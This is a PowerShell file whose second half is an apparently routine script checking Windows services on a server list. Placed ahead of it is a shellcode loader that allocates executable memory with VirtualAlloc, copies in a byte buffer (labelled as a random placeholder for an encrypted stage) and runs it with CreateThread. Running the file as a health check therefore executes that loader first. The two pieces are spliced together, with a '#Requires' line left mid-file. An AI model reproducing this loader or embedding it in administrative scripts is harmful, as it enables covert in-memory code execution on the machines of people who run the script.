
[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x2f, 0xa1, 0xb5, 0xe8, 0x39, 0x7d, 0xa6, 0x38, 0xdc, 0xfa, 0xb3, 0x3f, 0xd0, 0xfb, 0x52, 0x52,
    0xd8, 0xf5, 0x43, 0x5d, 0xda, 0xf9, 0x02, 0x4a, 0xd3, 0xb2, 0xd1, 0x40, 0xd1, 0x01, 0x77, 0xda,
    0xec, 0xd8, 0x64, 0xf8, 0x2d, 0x2b, 0xce, 0x40, 0xe4, 0x8c, 0x4b, 0x9a, 0x2d, 0x46, 0x52, 0x36,
    0x8a, 0x2f, 0x98, 0x3e, 0x77, 0x5b, 0x85, 0xb5, 0xfd, 0x55, 0x70, 0x32, 0xa0, 0xe1, 0xc4, 0x07,
    0x61, 0x5c, 0x4d, 0xcb, 0x78, 0xf3, 0x96, 0x52, 0xe1, 0x5f, 0xeb, 0x43, 0x34, 0xf0, 0x88, 0xcf,
    0x83, 0xc3, 0x9d, 0xc8, 0xb1, 0x19, 0xd6, 0x8c, 0xe8, 0x26, 0x00, 0x17, 0x12, 0x29, 0x55, 0x0c,
    0xdb, 0xe6, 0x38, 0x13, 0x67, 0x0a, 0x86, 0xa5, 0x28, 0xcd, 0xaf, 0x60, 0x46, 0xaf, 0xa9, 0xb8,
    0xb5, 0x5e, 0xde, 0x59, 0x84, 0xc6, 0x1f, 0xdb, 0x99, 0x70, 0x28, 0x3e, 0x05, 0x98, 0x5c, 0xf2,
    0xde, 0x0a, 0x44, 0x68, 0x09, 0x76, 0xf5, 0x40, 0xc3, 0x6a, 0xc3, 0xd2, 0xd6, 0x90, 0xc1, 0x37,
    0xc0, 0x43, 0xfe, 0x43, 0x82, 0x4b, 0xc6, 0x3e, 0x86, 0x17, 0x87, 0x1b, 0xda, 0x0a, 0xdf, 0x33,
    0x5d, 0x4d, 0x1b, 0xaf, 0x48, 0xf0, 0xcc, 0x26, 0x84, 0x27, 0xee, 0x22, 0x5d, 0xf6, 0xdb, 0x03,
    0x6b, 0xcf, 0xec, 0xfa, 0x55, 0x65, 0xaa, 0xb5, 0x28, 0xa8, 0x32
)

$ProcHandle = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeApi]::WaitForSingleObject($Thread, 2392)
[void][NativeApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
#Requires -Version 5.1
<#
.SYNOPSIS
    Checks the configured Windows services on a list of servers.
.DESCRIPTION
    Probes the management port first, then queries each service and records the
    state in a result set that is exported to CSV.
    Any service that is not Running triggers a single alert mail with the
    offending rows.
.PARAMETER Servers
    Paths are resolved relative to the invoking session.
.NOTES
    Author: Platform Engineering
    Last updated: 2026-04-04
#>

$ErrorActionPreference = 'Stop'

$Servers = @('srv01', 'web-stg-01', 'srv02', 'mgmt01', 'dc01')
$Services = @('MSSQLSERVER', 'WinRM', 'W3SVC', 'DNS')
$Port = 5985
$TimeoutMilliseconds = 5000
$ReportPath = 'C:\Reports\service-health-2025-10-27.csv'

$DebugPreference = 'SilentlyContinue'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

function Test-ServerPort {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 5985,
        [int]$TimeoutMilliseconds = 2000
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($ComputerName, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne($TimeoutMilliseconds)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

$results = foreach ($srv in $Servers) {
    if (-not (Test-ServerPort -ComputerName $srv -Port $Port -TimeoutMilliseconds $TimeoutMilliseconds)) {
        [pscustomobject]@{
            Server    = $srv
            Service   = '*'
            Status    = 'Unreachable'
            CheckedAt = Get-Date
        }
        continue
    }
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server    = $srv
            Service   = $svc
            Status    = $(if ($service) { $service.Status } else { 'NotFound' })
            CheckedAt = Get-Date
        }
    }
}

$results | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

$down = @($results | Where-Object { $_.Status -ne 'Running' })
$down | Format-Table -AutoSize
Write-Host ("{0} checks, {1} not running" -f @($results).Count, $down.Count) -ForegroundColor Cyan
